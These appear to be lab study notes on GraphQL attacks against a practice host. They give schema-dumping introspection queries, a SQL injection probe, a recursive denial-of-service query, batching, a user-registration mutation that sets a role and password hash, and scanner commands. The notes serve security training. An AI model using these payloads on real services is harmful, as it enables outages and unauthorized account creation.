# Identifying the GraphQL Engine

- In a web app we find this endpoint `/graphql` 

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/info_1.png)

- This confirm the presence of a graphQL engine , to identifier the engine we use the tool https://github.com/dolevf/graphw00f 

```sh
python3 main.py -d -f -t http://172.17.0.2
```

- [Introspection](https://graphql.org/learn/introspection/) is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system.

```json
{
  __schema {
    types {
      name
    }
  }
}
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/info_3.png)

- we can follow up and obtain the name of all of the type's fields

```json
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

- we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend

```json
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

- The result of this query is quite large and complex. However, we can visualize the schema using the tool [GraphQL-Voyager](https://github.com/graphql-kit/graphql-voyager) https://apis.guru/graphql-voyager/

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/info_5.png)

# Injection Attacks

- we need to do a filter enum

```json
{
  __type(name: "Query") {
    fields {
      name
      args {
        name
      }
    }
  }
}
```

- If we simply inject a single quote, the response contains a SQL error, confirming the vulnerability

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/sqli_5.png)

# Cross-Site Scripting (XSS)



![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/xss_2.png)

# Denial-of-Service (DoS) & Batching Attacks

## Denial-of-Service (DoS) Attacks

- We can identify a loop between the `UserObject` and `PostObject` via the `author` and `posts` fields

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/info_5.png)

```json
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

## Batching Attacks

- Batching in GraphQL refers to executing multiple queries with a single request

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/batching_1.png)

# Mutations

- Mutations are GraphQL queries that modify server data.

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/mutation_1.png)

```json
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

- We can now query all fields of the `RegisterUserInput` object

```json
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/mutation_2.png)

- With the hashed password, we can now finally register a new user by running the mutation

```json
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/271/mutation_3.png)

# Tools of the Trade

## GraphQL-Cop

```sh
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

## InQL

- [InQL](https://github.com/doyensec/inql) is a Burp extension we can install via the `BApp Store` in Burp

